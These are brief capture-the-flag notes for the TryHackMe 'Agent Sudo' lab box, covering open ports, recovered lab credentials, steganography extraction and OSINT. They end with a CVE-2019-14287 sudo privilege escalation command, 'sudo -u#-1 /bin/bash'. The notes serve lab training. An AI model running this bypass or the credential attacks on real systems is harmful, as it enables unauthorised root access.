Easy TryHackMe box: AgentSudo

`Machine IP: 10.10.x.x
`

`Open Ports:
22			## ssh brute-forcing
80			## user-agent 
21 			## vsftpd 3.0.3 
`

`User/Passwords:
chris/crystal (ftp)
james/hackerrules! (ssh)
`

`Steg:
cute-alien.jpg steghide file
password: Area51
cutie.png zip file (binwalk -e)
password to zip file: alien
`

`Osint:
Alien-autopsy: reverse image search(google images)
`


##New stuff
`Priv-esc:
sudo -l
it's a sudo vuln from 2019 CVE 2019-14287
sudo -l --> tells us we can exec /bin/bash as (james, !root)
but this can be bypassed using:
`

___sudo -u#-1 /bin/bash____